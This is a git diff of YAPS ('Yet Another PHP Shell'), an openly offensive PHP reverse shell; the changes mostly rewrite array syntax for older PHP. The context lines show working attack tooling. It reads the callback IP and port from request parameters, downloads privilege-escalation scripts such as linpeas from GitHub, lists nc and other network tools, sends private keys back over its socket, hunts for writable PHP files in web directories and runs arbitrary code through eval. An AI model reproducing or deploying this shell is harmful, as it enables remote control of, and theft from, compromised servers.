@@ -1,6 +1,6 @@
 <?php
 # YAPS - Yet Another PHP Shell
-# Version 1.0 - 07/07/21
+# Version 1.0.1 - 08/07/21
 # Made by Nicholas Ferreira
 # https://github.com/Nickguitar/YAPS
 # https://n.0x7359.com/?0b0011
@@ -14,10 +14,10 @@ ini_set('default_socket_timeout', pow(99, 6)); //negative timeout value should s
 
 ########################## CONFIGS ############################
 
-$resources = [
+$resources = array(
 "linpeas"   => "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh",
 "linenum"   => "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh",
-"suggester" => "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh"];
+"suggester" => "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh");
 
 $ip = '127.0.0.1';
 $port = 7359;
@@ -37,7 +37,7 @@ if(isset($_REQUEST['x']) && isset($_REQUEST['y'])){
 	$port = $_REQUEST['y'];
 }
 
-$commands = [
+$commands = array(
 //	"backdoor",
 	"color",
 //	"download",
@@ -49,7 +49,7 @@ $commands = [
 	"stabilize",
 	"suggester",
 //	"upload"
-];
+);
 
 
 function green($str){
@@ -91,7 +91,7 @@ function isAvailable($function){
 		$dis = explode(',', $dis); // split by comma
 		$dis = array_map('trim', $dis); //remove whitespace at the beginning and end
 	}else{
-		$dis = [];
+		$dis = array();
 	}
 	
 	if(is_callable($function) and !in_array($function, $dis))
@@ -208,7 +208,7 @@ function sysinfo(){
 	fwrite($s, $info);
 
 	fwrite($s, green("====================== Interesting binaries ======================\n\n"));
-	$interesting_binaries = ['nc','nc.traditional','ncat','nmap','perl','python','python2','python2.6','python2.7','python3','python3.6','python3.7','ruby','node','gcc','g++','docker','php'];
+	$interesting_binaries = array('nc','nc.traditional','ncat','nmap','perl','python','python2','python2.6','python2.7','python3','python3.6','python3.7','ruby','node','gcc','g++','docker','php');
 	foreach ($interesting_binaries as $binary) {
 		$binary = shell_exec("which $binary 2>/dev/null");
 		if($binary !== "" && base64_encode($binary.PHP_EOL) !== "Cg==") // if not empty or newline
@@ -236,8 +236,8 @@ function sysinfo(){
 			fwrite($s, $priv_key.PHP_EOL);
 
 	fwrite($s, green("\n=================== Writable PHP files ===================\n\n"));
-	$webfiles_arr = [];
-	$webdir = ['/var/www','/srv','/usr/local/apache2','/var/apache2','/var/www/nginx-default'];
+	$webfiles_arr = array();
+	$webdir = array('/var/www','/srv','/usr/local/apache2','/var/apache2','/var/www/nginx-default');
 	foreach($webdir as $dir)
 		$webfiles_arr = array_merge($webfiles_arr, explode("\n", shell_exec("find ".$dir." -type f -name '*.php*' -writable 2>/dev/null")));
 
@@ -363,8 +363,8 @@ function runPHP($code){ // guess what
 		$result = ob_get_contents(); //get buffer from eval() to return later
 		ob_end_clean();
 	}catch (Throwable $ex){
-		$err = explode("Stack trace:", $ex)[0];
-		$result = $err; //return the error
+		$err = explode("Stack trace:", $ex);
+		$result = $err[0]; //return the error
 	}
 	return $result;
 }
